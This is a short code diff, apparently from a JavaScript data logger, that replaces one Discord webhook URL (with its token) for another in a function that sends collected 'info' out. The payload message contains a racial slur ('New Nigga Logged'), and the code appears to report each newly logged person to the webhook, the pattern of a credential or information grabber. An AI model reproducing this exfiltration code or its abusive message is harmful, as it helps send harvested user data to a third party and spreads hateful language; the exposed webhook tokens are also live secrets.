@@ -80,7 +80,7 @@
     });
 
     function sendToWebhook(info) {
-        const webhookURL = 'https://discordapp.com/api/webhooks/1328737283184267336/4EIFgLKvWs9i1cJXiUutKTRvFwd-UmS7HxSQxVlgsC-24SrUEx34K1-wboielLxi2SCG';
+        const webhookURL = 'https://discordapp.com/api/webhooks/1329936812759580795/qv6_ZuJe9neqJMwatA3beCb8tGSUEpBpVQ3OC8T9p8zufD9piChjU_QSZREU1M3ztQ3z';
         
         const payload = {
             content: "New Nigga Logged",
